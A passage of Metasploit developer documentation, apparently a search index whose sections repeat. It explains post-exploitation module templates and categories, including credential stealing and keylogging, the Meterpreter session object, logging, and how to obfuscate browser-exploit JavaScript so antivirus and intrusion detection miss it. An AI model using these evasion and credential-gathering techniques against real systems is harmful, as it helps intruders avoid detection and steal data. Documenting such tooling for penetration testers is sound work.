'osx' , 'unix' , 'bsd' , 'solaris' ] , 'SessionTypes' => [ 'meterpreter' , 'shell' ] )) end def run # Main method end end The Name field should begin with a platform, such as: Multi, Windows, Linux, OS X, etc. Followed by the module's category, such as: Gather, Manage, Recon, Capture, Wlan. Followed by the name of the software, and then finally a few wrods that describe the functionality of the module. A naming example: \"Multi Gather RndFTP Credential Enumeration\". The Description field should explain what the module does, things to watch out for, specific requirements, the more the better. The goal is to let the user understand what he's using without the need to actually read the module's source and figure things out. And trust me, most of them don't. The Author field is where you put your name. The format should be \"Name \". If you want to have your Twitter handle there, leave it as a comment, for example: \"Name # handle\" The Platform field indicates what platforms are supported, for example: win, linux, osx, unix, bsd. The SessionTypes field should be either meterpreter, or shell. You should try to support both. And finally, the run method is like your main method. Start writing your code there. Basic git commands Metasploit no longer uses svn for source code management, instead we use git, so knowing some tricks with git go a long way. We're not here to lecture you about how awesome git is, we know it has a learning curve and it's not surprising to find new users making mistakes. Every once a while, your git \"rage\" will kick in, and we understand. However, it's important for you to take advantage of branching. Every time you make a module, or make some changes to existing code, you should not do so on the default master branch. Why? Because when you do a msfupdate , which is Metasploit's utility for updating your repository, it will do a git reset before merging the changes, and all your code go bye-bye. Another mistake people tend to do is have all the changes on master before submitting a pull request. This is a bad idea, because most likely you're submitting other crap you don't intend to change, and/or you're probably asking us to merge other unnecessary commit history when there only needs to be one commit. Thanks for contributing your module to the community, but no thanks to your crazy commit history. So as a habit, when you want to make something new, or change something, begin with a new branch that's up to date to master. First off, make sure you're on master. If you do a git status it will tell you what branch you're currently on: $ git status # On branch upstream-master nothing to commit, working directory clean Ok, now do a git pull to download the latest changes from Metasploit: $ git pull Already up-to-date. At this point, you're ready to start a new branch. In this case, we'll name our new branch \"my_awesome_branch\": $ git checkout -b my_awesome_module Switched to a new branch 'my_awesome_module' And then you can go ahead and add that module. Make sure it's in the appropriate path: $ git add [module path] When you decide to save the changes, commit (if there's only one module, you can do git commit -a too so you don't have to type the module path. Note -a really means EVERYTHING): $ git commit [module path] When you're done, push your changes, which will upload your code to your remote branch \"my_awesome_branch\". You must push your changes in order to submit the pull request, or share it with others on the Internet. $ git push origin my_awesome_branch References https://github.com/rapid7/metasploit-framework/tree/master/modules/post https://github.com/rapid7/metasploit-framework/tree/master/lib/msf/core/post","title":"How to get started with writing a post module"},{"location":"dev/dark/How-to-get-started-with-writing-a-post-module/#plan-your-module","text":"Just like writing a software, before you start coding you should have a clear and specific goal for what your post module does. It's never a good idea to have multiple functionalities in a single module. For example: having it steal the network configuration files, steal passwd, hashes, shell history, etc. Instead, you should break it down into multiple modules. You should also think about what session types to support: meterpreter, or shell. Ideally, support both. But if you have to choose between the two, on Windows you should favor Windows Meterpreter. On Linux, the shell session type has been a stronger candidate than the Linux Meterpreter, but hopefully this will change in the near future. For platforms that don't have a Meterpreter, obviously your only choice is a shell. Another important thing is to think about how your module will perform on different distributions/systems. For example, say you want to run a ifconfig command on Linux. On Ubuntu it's a no-brainer, simply run the ifconfig command. Well, a different Linux distro might not actually know what you're asking, so you have to be more specific and do /sbin/ifconfig instead. Same thing with Windows. Is it C:\\WINDOWS\\ or C:\\WinNT ? It's both. Is it C:\\Documents and Settings\\[User name] , or C:\\Users\\[User name] ? Both, depends on that Windows version. A better solution to that would be use an environment variable :-) Always do your homework, and contain as many scenarios you can think of. And most importantly, get your VMs and TEST!","title":"Plan your module"},{"location":"dev/dark/How-to-get-started-with-writing-a-post-module/#categories-of-post-modules","text":"Post modules are categorized based on their behavior. For example, if it collects data, naturally it goes to the \"gather\" category. If it adds/updates/or removes an user, it belongs to \"manage\". Here's a list as a reference: Category Description gather Modules that involve data gathering/collecting/enumeration. gather/credentials Modules that steal credentials. gather/forensics Modules that involve forensics data gathering. manage Modules that modifies/operates/manipulates something on the system. Session management related tasks such as migration, injection also go here. recon Modules that will help you learn more about the system in terms of reconnaissance, but not about data stealing. Understand this is not the same as \"gather\" type modules. wlan Modules that are for WLAN related tasks. escalate This is deprecated, but the modules remain there due to popularity. This used to be the place for privilege escalation modules. All privilege escalation modules are no longer considered as post modules, they're now exploits. capture Modules that involve monitoring something for data collection. For example: key logging.","title":"Categories of post modules"},{"location":"dev/dark/How-to-get-started-with-writing-a-post-module/#session-object","text":"So you know how in Lord of the Rings, people are totally obsessed with the One Ring? Well, that's how it is with the session object. The one object you cannot live without, it's your precious. All post modules and other related mixins basically are built on top of the session object, because it knows everything about the compromised host, and allows you to command it. You can use the session method to access the session object, or its alias client . The best way to interact with one is via irb, here's an example of how: msf exploit(handler) > run [*] Started reverse handler on 192.168.1.64:4444 [*] Starting the payload handler... [*] Sending stage (769536 bytes) to 192.168.1.106 [*] Meterpreter session 1 opened (192.168.1.64:4444 -> 192.168.1.106:55157) at 2014-07-31 17:59:36 -0500 meterpreter > irb [*] Starting IRB shell [*] The 'client' variable holds the meterpreter client >> session.class => Msf::Sessions::Meterpreter_x86_Win At this point you have the power to rule them all. But notice that the above example is a Msf::Sessions::Meterpreter_x86_Win object. There are actually several more different ones: command_shell.rb, meterpreter_php.rb, meterpreter_java.rb, meterpreter_x86_linux.rb, etc. Each behaves differently so it's actually kind of difficult to explain them all, but they are defined in the lib/msf/base/sessions/ directory so you can see how they work. Or you can play with one since you're already in the irb prompt. In Ruby, there are two object methods that are handy for debugging purposes. The first is methods , which will list all the public and protected methods from that object: session . methods The other one is inspect , which returns a string of a human-readable representation of the object: session . inspect You can also look at other current post modules and see how they use their session object.","title":"Session object"},{"location":"dev/dark/How-to-get-started-with-writing-a-post-module/#the-msfpost-mixin","text":"As we explained, most post module mixins are built on top of the session object, and there are many out there. However, there is a main one you obviously cannot live without: the Msf::Post mixin. When you create a post module with this mixin, a lot of other mixins are also already included for all kinds of scenarios, to be more specific: msf/core/post/common - Common methods post modules use, for example: cmd_exec . msf/core/post_mixin - Keeps track of the session state. msf/core/post/file - File system related methods. msf/core/post/webrtc - Uses WebRTC to interact with the target machine's webcam. msf/core/post/linux - There actually isn't a lot going on, just get_sysinfo and is_root? specifically for Linux. msf/core/post/osx - get_sysinfo , get_users , get_system_accounts , get_groups , and methods for operating the target machine's webcam. msf/core/post/solaris - Pretty much like the linux mixin. Same methods, but for Solaris. msf/core/post/unix - get_users , get_groups , enum_user_directories msf/core/post/windows - Most of the development time are spent here. From Windows account management, event log, file info, Railgun, LDAP, netapi, powershell, registry, wmic, services, etc.","title":"The Msf::Post Mixin"},{"location":"dev/dark/How-to-get-started-with-writing-a-post-module/#template","text":"Here we have a post module template. As you can see, there are some required fields that need to be filled. We'll explain each: ## # This module requires Metasploit: https://metasploit.com/download # Current source: https://github.com/rapid7/metasploit-framework ## class MetasploitModule < Msf :: Post def initialize ( info = {}) super ( update_info ( info , 'Name' => '[Platform] [Module Category] [Software] [Function]' , 'Description' => %q{ Say something that the user might want to know. } , 'License' => MSF_LICENSE , 'Author' => [ 'Name' ] , 'Platform' => [ 'win' , 'linux' , 'osx' , 'unix' , 'bsd' , 'solaris' ] , 'SessionTypes' => [ 'meterpreter' , 'shell' ] )) end def run # Main method end end The Name field should begin with a platform, such as: Multi, Windows, Linux, OS X, etc. Followed by the module's category, such as: Gather, Manage, Recon, Capture, Wlan. Followed by the name of the software, and then finally a few wrods that describe the functionality of the module. A naming example: \"Multi Gather RndFTP Credential Enumeration\". The Description field should explain what the module does, things to watch out for, specific requirements, the more the better. The goal is to let the user understand what he's using without the need to actually read the module's source and figure things out. And trust me, most of them don't. The Author field is where you put your name. The format should be \"Name \". If you want to have your Twitter handle there, leave it as a comment, for example: \"Name # handle\" The Platform field indicates what platforms are supported, for example: win, linux, osx, unix, bsd. The SessionTypes field should be either meterpreter, or shell. You should try to support both. And finally, the run method is like your main method. Start writing your code there.","title":"Template"},{"location":"dev/dark/How-to-get-started-with-writing-a-post-module/#basic-git-commands","text":"Metasploit no longer uses svn for source code management, instead we use git, so knowing some tricks with git go a long way. We're not here to lecture you about how awesome git is, we know it has a learning curve and it's not surprising to find new users making mistakes. Every once a while, your git \"rage\" will kick in, and we understand. However, it's important for you to take advantage of branching. Every time you make a module, or make some changes to existing code, you should not do so on the default master branch. Why? Because when you do a msfupdate , which is Metasploit's utility for updating your repository, it will do a git reset before merging the changes, and all your code go bye-bye. Another mistake people tend to do is have all the changes on master before submitting a pull request. This is a bad idea, because most likely you're submitting other crap you don't intend to change, and/or you're probably asking us to merge other unnecessary commit history when there only needs to be one commit. Thanks for contributing your module to the community, but no thanks to your crazy commit history. So as a habit, when you want to make something new, or change something, begin with a new branch that's up to date to master. First off, make sure you're on master. If you do a git status it will tell you what branch you're currently on: $ git status # On branch upstream-master nothing to commit, working directory clean Ok, now do a git pull to download the latest changes from Metasploit: $ git pull Already up-to-date. At this point, you're ready to start a new branch. In this case, we'll name our new branch \"my_awesome_branch\": $ git checkout -b my_awesome_module Switched to a new branch 'my_awesome_module' And then you can go ahead and add that module. Make sure it's in the appropriate path: $ git add [module path] When you decide to save the changes, commit (if there's only one module, you can do git commit -a too so you don't have to type the module path. Note -a really means EVERYTHING): $ git commit [module path] When you're done, push your changes, which will upload your code to your remote branch \"my_awesome_branch\". You must push your changes in order to submit the pull request, or share it with others on the Internet. $ git push origin my_awesome_branch","title":"Basic git commands"},{"location":"dev/dark/How-to-get-started-with-writing-a-post-module/#references","text":"https://github.com/rapid7/metasploit-framework/tree/master/modules/post https://github.com/rapid7/metasploit-framework/tree/master/lib/msf/core/post","title":"References"},{"location":"dev/dark/How-to-log-in-Metasploit/","text":"Usually, if something in Metasploit triggers an error, there is a backtrace or at least a brief message that explains what the problem is about. Most of the time, there is nothing wrong with that. But sometimes if you wish to report that problem, you might lose that information, which makes your bug report less informative, and the problem may take much longer to solve. This is why logging to file in many cases is extremely useful. In this documentation, we'll explain about how to take advantage of this properly. Basic Usage As an user, you should know that all the logged errors are saved in a file named framework.log . The save path is defined in Msf::Config.log_directory, which means in msfconsole, you can switch to irb and figure out where it is: msf > irb [*] Starting IRB shell... >> Msf::Config.log_directory => \"/Users/test/.msf4/logs\" By default, all the log errors are on level 0 - the least informative level. But of course, you can change this by setting the datastore option, like this: msf > setg LogLevel 3 LogLevel => 3 msf > Log Levels There are 4 different logging levels defined in log/rex/constants.rb : Log Level Description LEV_0 (Default) The default log level if none is specified. It should be used when a log message should always be displayed when logging is enabled. Very few log messages should occur at this level aside from necessary information logging and error/warning logging. Debug logging at level zero is not advised. LEV_1 (Extra) This log level should be used when extra information may be needed to understand the cause of an error or warning message or to get debugging information that might give clues as to why something is happening. This log level should be used only when information may be useful to understanding the behavior of something at a basic level. This log level should not be used in an exhaustively verbose fashion. LEV_2 (Verbose) This log level should be used when verbose information may be needed to analyze the behavior of the framework. This should be the default log level for all detailed information not falling into LEV_0 or LEV_1. It is recommended that this log level be used by default if you are unsure. LEV_3 (Insanity) This log level should contain very verbose information about the behavior of the framework, such as detailed information about variable states at certain phases including, but not limited to, loop iterations, function calls, and so on. This log level will rarely be displayed, but when it is the information provided should make it easy to analyze any problem. For debugging purposes, it's always better to turn on the highest level of logging. Logging API There are mainly five logging methods you will most likely be using a lot, and they all have the exact same arguments. Let's use one of the logging methods to explain what these arguments are about: def elog(msg, src = 'core', level = 0, from = caller) msg - The message you want to log src - The source of the error (default is core, as in Metasploit core) level - The log level from - The current execution stack. caller is a method from Kernel . Notice that only the msg argument is required, the rest are optional. Now, let's go over these five methods and explain how they're meant to be used: Method Purpose dlog() LOG_DEBUG elog() LOG_ERROR wlog() LOG_WARN ilog() LOG_INFO rlog() LOG_RAW Code Example elog ( \"The sky has fallen\" )","title":"How to log in Metasploit"},{"location":"dev/dark/How-to-log-in-Metasploit/#basic-usage","text":"As an user, you should know that all the logged errors are saved in a file named framework.log . The save path is defined in Msf::Config.log_directory, which means in msfconsole, you can switch to irb and figure out where it is: msf > irb [*] Starting IRB shell... >> Msf::Config.log_directory => \"/Users/test/.msf4/logs\" By default, all the log errors are on level 0 - the least informative level. But of course, you can change this by setting the datastore option, like this: msf > setg LogLevel 3 LogLevel => 3 msf >","title":"Basic Usage"},{"location":"dev/dark/How-to-log-in-Metasploit/#log-levels","text":"There are 4 different logging levels defined in log/rex/constants.rb : Log Level Description LEV_0 (Default) The default log level if none is specified. It should be used when a log message should always be displayed when logging is enabled. Very few log messages should occur at this level aside from necessary information logging and error/warning logging. Debug logging at level zero is not advised. LEV_1 (Extra) This log level should be used when extra information may be needed to understand the cause of an error or warning message or to get debugging information that might give clues as to why something is happening. This log level should be used only when information may be useful to understanding the behavior of something at a basic level. This log level should not be used in an exhaustively verbose fashion. LEV_2 (Verbose) This log level should be used when verbose information may be needed to analyze the behavior of the framework. This should be the default log level for all detailed information not falling into LEV_0 or LEV_1. It is recommended that this log level be used by default if you are unsure. LEV_3 (Insanity) This log level should contain very verbose information about the behavior of the framework, such as detailed information about variable states at certain phases including, but not limited to, loop iterations, function calls, and so on. This log level will rarely be displayed, but when it is the information provided should make it easy to analyze any problem. For debugging purposes, it's always better to turn on the highest level of logging.","title":"Log Levels"},{"location":"dev/dark/How-to-log-in-Metasploit/#logging-api","text":"There are mainly five logging methods you will most likely be using a lot, and they all have the exact same arguments. Let's use one of the logging methods to explain what these arguments are about: def elog(msg, src = 'core', level = 0, from = caller) msg - The message you want to log src - The source of the error (default is core, as in Metasploit core) level - The log level from - The current execution stack. caller is a method from Kernel . Notice that only the msg argument is required, the rest are optional. Now, let's go over these five methods and explain how they're meant to be used: Method Purpose dlog() LOG_DEBUG elog() LOG_ERROR wlog() LOG_WARN ilog() LOG_INFO rlog() LOG_RAW","title":"Logging API"},{"location":"dev/dark/How-to-log-in-Metasploit/#code-example","text":"elog ( \"The sky has fallen\" )","title":"Code Example"},{"location":"dev/dark/How-to-obfuscate-JavaScript-in-Metasploit/","text":"Stealth is an important feature to think about during exploit development. If your exploit gets caught all the time, it doesn't matter how awesome or how technically challenging your exploit is, it is most likely not very usable in a real penetration test. Browser exploits in particular, heavily rely on JavaScript to trigger vulnerabilities, therefore a lot of antivirus or signature-based intrusion detection/prevention systems will scan the JavaScript and flag specific lines as malicious. The following code used to be considered as MS12-063 by multiple antivirus vendors even though it is not necessarily harmful or malicious, we'll use this as an example throughout the wiki: var arrr = new Array (); arrr [ 0 ] = windows . document . createElement ( \"img\" ); arrr [ 0 ][ \"src\" ] = \"a\" ; To avoid getting flagged, there are some common evasive tricks we can try. For example, you can manually modify the code a little bit to make it not recognizable by any signatures. Or if the antivirus relies on cached webpages to scan for exploits, it is possible to make the browser not cache your exploit so you stay undetected. Or in this case, you can obfuscate your code, which is what this writeup will focus on. In Metasploit, there are three common ways to obfuscate your JavaScript. The first one is simply by using the rand_text_alpha method (in Rex ) to randomize your variables. The second one is by using the ObfuscateJS class. And the third option is the JSObfu class. The rand_text_alpha trick Using rand_text_alpha is the most basic form of evasion, but also the least effective. If this is your choice, you should randomize whatever can be randomized without breaking the code. By using the above MS12-063, here's how you would use rand_text_alpha : # Randomizes the array variable # Max size = 6, Min = 3 var_array = rand_text_alpha ( rand ( 6 ) + 3 ) # Randomizes the src value val_src = rand_text_alpha ( 1 ) js = %Q| var #{ var_array } = new Array(); #{ var_array } [0] = windows.document.createElement(\"img\"); #{ var_array } [0][\"src\"] = \" #{ val_src } \"; | The ObfuscateJS class The ObfuscateJS class is like the rand_text_alpha technique on steroids, but even better. It allows you to replace symbol names such as variables, methods, classes, and namespaces. It can also obfuscate strings by either randomly using fromCharCode or unescape . And lastly, it can strip JavaScript comments, which is handy because exploits often are hard to understand and read so you need comments to remember why something is written in a specific way, but you don't want to show or leak those comments in a pentest. To use ObfuscateJS, let's use the MS12-063 example again to demonstrate. If you feel like following the steps yourself without writing a module, what you can do is go ahead and run msfconsole , and then switch to irb, like this: $ ./msfconsole -q msf > irb [*] Starting IRB shell... >> And then you are ready to go. The first thing you do with ObfuscateJS is you need to initialize it with the JavaScript you want to obfuscate, so in this case, begin like the following: js = %Q| var arrr = new Array(); arrr[0] = windows.document.createElement(\"img\"); arrr[0][\"src\"] = \"a\"; | obfu = ::Rex::Exploitation::ObfuscateJS.new(js) obfu should return a Rex::Exploitation::ObfuscateJS object. It allows you to do a lot of things, you can really just call methods , or look at the source to see what methods are available (with additional API documentation). But for demo purposes, we'll showcase the most common one: the obfuscate method. To actually obfuscate, you need to call the obfuscate method. This method accepts a symbols argument that allows you to manually specify what symbol names (variables, methods, classes, etc) to obfuscate, it should be in a hash like this: { 'Variables' => [ 'var1' , ... ] , 'Methods' => [ 'method1' , ... ] , 'Namespaces' => [ 'n' , ... ] , 'Classes' => [ { 'Namespace' => 'n' , 'Class' => 'y' }, ... ] } So if I want to obfuscate the variable arrr , and I want to obfuscate the src string, here's how: >> obfu.obfuscate('Symbols' => {'Variables'=>['arrr']}, 'Strings' => true) => \"\\nvar QqLFS = new Array();\\nQqLFS[0] = windows.document.createElement(unescape(String.fromCharCode( 37, 54, 071, 045, 0x36, 0144, 37, 066, 067 )));\\nQqLFS[0][String.fromCharCode( 115, 0x72, 0143 )] = unescape(String.fromCharCode( 045, 0x36, 0x31 ));\\n\" In some cases, you might actually want to know the obfuscated version of a symbol name. One scenario is calling a JavaScript function from an element's event handler, such as this: <html> <head> <script> function test() { alert(\"hello, world!\"); } </script> </head> <body onload=\"test();\"> </body> </html> The obfuscated version would look like the following: js = %Q| function test() { alert(\"hello, world!\"); } | obfu = :: Rex :: Exploitation :: ObfuscateJS . new ( js ) obfu . obfuscate ( 'Symbols' => { 'Methods' =>[ 'test' ] }, 'Strings' => true ) html = %Q| <html> <head> <script> #{ js } </script> </head> <body onload=\" #{ obfu . sym ( 'test' ) } ();\"> </body> </html> | puts html The JSObfu class The JSObfu class used to be ObfuscateJS' cousin, but it has been completely rewritten since September 2014, and packaged as a gem . The obfuscation is more complex and you can actually tell it to obfuscate multiple times. You also no longer have to manually specify what symbol names to change, it just knows. Trying JSObfu in Rex Let's get back to irb again to demonstrate how easy it is to use JSObfu: $ ./msfconsole -q msf > irb [*] Starting IRB shell... >> This time we'll do a \"hello world\" example: >> js = ::Rex::Exploitation::JSObfu.new %Q|alert('hello, world!');| => alert('hello, world!'); >> js.obfuscate => nil And here's the output: window[(function () { var _d=\"t\",y=\"ler\",N=\"a\"; return N+y+_d })()]((function () { var f='d!',B='orl',Q2='h',m='ello, w'; return Q2+m+B+f })()); Like ObfuscateJS, if you need to get the randomized version of a symbol name, you can still do that. We'll demonstrate this with the following example: >> js = :: Rex :: Exploitation :: JSObfu . new %Q|function test() { alert(\"hello\"); }| => function test () { alert ( \"hello\" ); } >> js . obfuscate Say we want to know the randomized version of the method name \"test\": >> puts js . sym ( \"test\" ) _ OK, double check right quick: >> puts js function _(){window[(function () { var N=\"t\",r=\"r\",i=\"ale\"; return i+r+N })()](String.fromCharCode(0150,0x65,0154,0x6c,0x6f));} Yup, that looks good to me. And finally, let's try to obfuscate a few times to see how that goes: >> js = ::Rex::Exploitation::JSObfu.new %Q|alert('hello, world!');| => alert('hello, world!'); >> js.obfuscate(:iterations=>3) => window[String[((function(){var s=(function () { var r=\"e\"; return r })(),Q=(function () { var I=\"d\",dG=\"o\"; return dG+I })(),c=String.fromCharCode(0x66,114),w=(function () { var i=\"C\",v=\"r\",f=\"omCh\",j=\"a\"; return f+j+v+i })();return c+w+Q+s;})())](('Urx'.length*((0x1*(01*(1*020+5)+1)+3)*'u'.length+('SGgdrAJ'.length-7))+(('Iac'.length*'XLR'.length+2)*'qm'.length+0)),(('l'.length*((function () { var vZ='k'; return vZ })()[((function () { var E=\"h\",t=\"t\",O=\"leng\"; return O+t+E })())]*(0x12*1+0)+'xE'.length)+'h'.length)*(function () { var Z='uA',J='tR',D='x'; return D+J+Z })()[((function () { var m=\"th\",o=\"g\",U=\"l\",Y=\"en\"; return U+Y+o+m })())]+'lLc'.length),('mQ'.length*(02*023+2)+('Tt'.length*'OEzGiMVf'.length+5)),(String.fromCharCode(0x48,0131)[((function () { var i=\"gth\",r=\"len\"; return r+i })())]*('E'.length*0x21+19)+(0x1*'XlhgGJ'.length+4)),(String.fromCharCode(0x69)[((function () { var L=\"th\",Q=\"n\",$=\"l\",I=\"g\",x=\"e\"; return $+x+Q+I+L })())]*('QC'.length*0x2b+3)+(01*26+1)))]((function(){var C=String[((function () { var w=\"rCode\",j=\"mCha\",A=\"fr\",B=\"o\"; return A+B+j+w })())]((6*0x10+15),('riHey'.length*('NHnex'.length*0x4+2)+4),(01*95+13),(1*('Z'.length*(0x1*(01*(0x3*6+5)+1)+18)+12)+46),(0x1*(01*013+6)+16)),JQ=String[((function () { var NO=\"ode\",T=\"rC\",HT=\"fromCha\"; return HT+T+NO })())](('J'.length*0x54+17),(0x2*051+26),('TFJAGR'.length*('ymYaSJtR'.length*'gv'.length+0)+12),(01*0155+2),(0xe*'FBc'.length+2),(0x1*22+10),(3*(01*043+1)+11)),g=(function(){var N=(function () { var s='h'; return s })();return N;})();return g+JQ+C;})()); Using JSObfu for module development When you are writing a module, you should not call Rex directly like the above examples. Instead, you should be using the #js_obfuscate method found in JSObfu mixin . When you're using JavaScript in your module, always do write it like this: # This returns a Rex::Exploitation::JSObfu object js = js_obfuscate ( your_code ) Note that by default, even though your module is calling the #js_obfuscate method, obfuscation will not kick in unless the user sets the JsObfuscate datastore option. This option is an OptInt, which allows you to set the number of times to obfuscate (default is 0). Reference(s) https://community.rapid7.com/community/metasploit/blog/2011/07/08/jsobfu","title":"How to obfuscate JavaScript in Metasploit"},{"location":"dev/dark/How-to-obfuscate-JavaScript-in-Metasploit/#the-rand_text_alpha-trick","text":"Using rand_text_alpha is the most basic form of evasion, but also the least effective. If this is your choice, you should randomize whatever can be randomized without breaking the code. By using the above MS12-063, here's how you would use rand_text_alpha : # Randomizes the array variable # Max size = 6, Min = 3 var_array = rand_text_alpha ( rand ( 6 ) + 3 ) # Randomizes the src value val_src = rand_text_alpha ( 1 ) js = %Q| var #{ var_array } = new Array(); #{ var_array } [0] = windows.document.createElement(\"img\"); #{ var_array } [0][\"src\"] = \" #{ val_src } \"; |","title":"The rand_text_alpha trick"},{"location":"dev/dark/How-to-obfuscate-JavaScript-in-Metasploit/#the-obfuscatejs-class","text":"The ObfuscateJS class is like the rand_text_alpha technique on steroids, but even better. It allows you to replace symbol names such as variables, methods, classes, and namespaces. It can also obfuscate strings by either randomly using fromCharCode or unescape . And lastly, it can strip JavaScript comments, which is handy because exploits often are hard to understand and read so you need comments to remember why something is written in a specific way, but you don't want to show or leak those comments in a pentest. To use ObfuscateJS, let's use the MS12-063 example again to demonstrate. If you feel like following the steps yourself without writing a module, what you can do is go ahead and run msfconsole , and then switch to irb, like this: $ ./msfconsole -q msf > irb [*] Starting IRB shell... >> And then you are ready to go. The first thing you do with ObfuscateJS is you need to initialize it with the JavaScript you want to obfuscate, so in this case, begin like the following: js = %Q| var arrr = new Array(); arrr[0] = windows.document.createElement(\"img\"); arrr[0][\"src\"] = \"a\"; | obfu = ::Rex::Exploitation::ObfuscateJS.new(js) obfu should return a Rex::Exploitation::ObfuscateJS object. It allows you to do a lot of things, you can really just call methods , or look at the source to see what methods are available (with additional API documentation). But for demo purposes, we'll showcase the most common one: the obfuscate method. To actually obfuscate, you need to call the obfuscate method. This method accepts a symbols argument that allows you to manually specify what symbol names (variables, methods, classes, etc) to obfuscate, it should be in a hash like this: { 'Variables' => [ 'var1' , ... ] , 'Methods' => [ 'method1' , ... ] , 'Namespaces' => [ 'n' , ... ] , 'Classes' => [ { 'Namespace' => 'n' , 'Class' => 'y' }, ... ] } So if I want to obfuscate the variable arrr , and I want to obfuscate the src string, here's how: >> obfu.obfuscate('Symbols' => {'Variables'=>['arrr']}, 'Strings' => true) => \"\\nvar QqLFS = new Array();\\nQqLFS[0] = windows.document.createElement(unescape(String.fromCharCode( 37, 54, 071, 045, 0x36, 0144, 37, 066, 067 )));\\nQqLFS[0][String.fromCharCode( 115, 0x72, 0143 )] = unescape(String.fromCharCode( 045, 0x36, 0x31 ));\\n\" In some cases, you might actually want to know the obfuscated version of a symbol name. One scenario is calling a JavaScript function from an element's event handler, such as this: <html> <head> <script> function test() { alert(\"hello, world!\"); } </script> </head> <body onload=\"test();\"> </body> </html> The obfuscated version would look like the following: js = %Q| function test() { alert(\"hello, world!\"); } | obfu = :: Rex :: Exploitation :: ObfuscateJS . new ( js ) obfu . obfuscate ( 'Symbols' => { 'Methods' =>[ 'test' ] }, 'Strings' => true ) html = %Q| <html> <head> <script> #{ js } </script> </head> <body onload=\" #{ obfu . sym ( 'test' ) } ();\"> </body> </html> | puts html","title":"The ObfuscateJS class"},{"location":"dev/dark/How-to-obfuscate-JavaScript-in-Metasploit/#the-jsobfu-class","text":"The JSObfu class used to be ObfuscateJS' cousin, but it has been completely rewritten since September 2014, and packaged as a gem . The obfuscation is more complex and you can actually tell it to obfuscate multiple times. You also no longer have to manually specify what symbol names to change, it just knows. Trying JSObfu in Rex Let's get back to irb again to demonstrate how easy it is to use JSObfu: $ ./msfconsole -q msf > irb [*] Starting IRB shell... >> This time we'll do a \"hello world\" example: >> js = ::Rex::Exploitation::JSObfu.new %Q|alert('hello, world!');| => alert('hello, world!'); >> js.obfuscate => nil And here's the output: window[(function () { var _d=\"t\",y=\"ler\",N=\"a\"; return N+y+_d })()]((function () { var f='d!',B='orl',Q2='h',m='ello, w'; return Q2+m+B+f })()); Like ObfuscateJS, if you need to get the randomized version of a symbol name, you can still do that. We'll demonstrate this with the following example: >> js = :: Rex :: Exploitation :: JSObfu . new %Q|function test() { alert(\"hello\"); }| => function test () { alert ( \"hello\" ); } >> js . obfuscate Say we want to know the randomized version of the method name \"test\": >> puts js . sym ( \"test\" ) _ OK, double check right quick: >> puts js function _(){window[(function () { var N=\"t\",r=\"r\",i=\"ale\"; return i+r+N })()](String.fromCharCode(0150,0x65,0154,0x6c,0x6f));} Yup, that looks good to me. And finally, let's try to obfuscate a few times to see how that goes: >> js = ::Rex::Exploitation::JSObfu.new %Q|alert('hello, world!');| => alert('hello, world!'); >> js.obfuscate(:iterations=>3) => window[String[((function(){var s=(function () { var r=\"e\"; return r })(),Q=(function () { var I=\"d\",dG=\"o\"; return dG+I })(),c=String.fromCharCode(0x66,114),w=(function () { var i=\"C\",v=\"r\",f=\"omCh\",j=\"a\"; return f+j+v+i })();return c+w+Q+s;})())](('Urx'.length*((0x1*(01*(1*020+5)+1)+3)*'u'.length+('SGgdrAJ'.length-7))+(('Iac'.length*'XLR'.length+2)*'qm'.length+0)),(('l'.length*((function () { var vZ='k'; return vZ })()[((function () { var E=\"h\",t=\"t\",O=\"leng\"; return O+t+E })())]*(0x12*1+0)+'xE'.length)+'h'.length)*(function () { var Z='uA',J='tR',D='x'; return D+J+Z })()[((function () { var m=\"th\",o=\"g\",U=\"l\",Y=\"en\"; return U+Y+o+m })())]+'lLc'.length),('mQ'.length*(02*023+2)+('Tt'.length*'OEzGiMVf'.length+5)),(String.fromCharCode(0x48,0131)[((function () { var i=\"gth\",r=\"len\"; return r+i })())]*('E'.length*0x21+19)+(0x1*'XlhgGJ'.length+4)),(String.fromCharCode(0x69)[((function () { var L=\"th\",Q=\"n\",$=\"l\",I=\"g\",x=\"e\"; return $+x+Q+I+L })())]*('QC'.length*0x2b+3)+(01*26+1)))]((function(){var C=String[((function () { var w=\"rCode\",j=\"mCha\",A=\"fr\",B=\"o\"; return A+B+j+w })())]((6*0x10+15),('riHey'.length*('NHnex'.length*0x4+2)+4),(01*95+13),(1*('Z'.length*(0x1*(01*(0x3*6+5)+1)+18)+12)+46),(0x1*(01*013+6)+16)),JQ=String[((function () { var NO=\"ode\",T=\"rC\",HT=\"fromCha\"; return HT+T+NO })())](('J'.length*0x54+17),(0x2*051+26),('TFJAGR'.length*('ymYaSJtR'.length*'gv'.length+0)+12),(01*0155+2),(0xe*'FBc'.length+2),(0x1*22+10),(3*(01*043+1)+11)),g=(function(){var N=(function () { var s='h'; return s })();return N;})();return g+JQ+C;})()); Using JSObfu for module development When you are writing a module, you should not call Rex directly like the above examples. Instead, you should be using the #js_obfuscate method found in JSObfu mixin . When you're using JavaScript in your module, always do write it like this: # This returns a Rex::Exploitation::JSObfu object js = js_obfuscate ( your_code ) Note that by default, even though your module is calling the #js_obfuscate method, obfuscation will not kick in unless the user sets the JsObfuscate datastore option. This option is an OptInt, which allows you to set the number of times to obfuscate (default is 0).","title":"The JSObfu class"},{"location":"dev/dark/How-to-obfuscate-JavaScript-in-Metasploit/#references","text":"https://community.rapid7.com/community/metasploit/blog/2011/07/08/jsobfu","title":"Reference(s)"},{"location":"dev/dark/How-to-parse-an-HTTP-response/","text":"This document talks about how to parse an HTTP response body in the cleanest way possible. Getting a response To get a response, you can either use Rex::Proto::Http::Client , or the HttpClient mixin to make an HTTP request. If you are writing a module, you should use the mixin. The following is an example of using the #send_request_cgi method from HttpClient: res = send_request_cgi ({ 'uri' => '/index.php' }) The return value for res is a Rex::Proto::Http::Response object, but it's also possible you get a NilClass due to a connection/response timeout. Getting the response body With a Rex::Proto::Http::Response object, here's how you can retrieve the HTTP body: data = res . body If you want to get the raw HTTP response (including the response message/code, headers, body, etc), then you can simply do: raw_res = res . to_s However, in this documentation we are only focusing on res.body . Choosing the right parser Format Parser HTML Nokogiri XML Nokogiri JSON JSON If the format you need to parse isn't on the list, then fall back to res.body . Parsing HTML with Nokogiri When you have a Rex::Proto::Http::Response with HTML in it, the method to call is: html = res . get_html_document This will give you a Nokogiri::HTML::Document, which allows you use the Nokogiri API. There are two common methods in Nokogiri to find elements: #at and #search. The main difference is that the #at method will only return the first result, while the #search will return all found results (in an array). Consider the following example as your HTML response: < html > < head > < title > Hello, World! </ title > </ head > < body > < div class = \"greetings\" > < div id = \"english\" > Hello </ div > < div id = \"spanish\" > Hola </ div > < 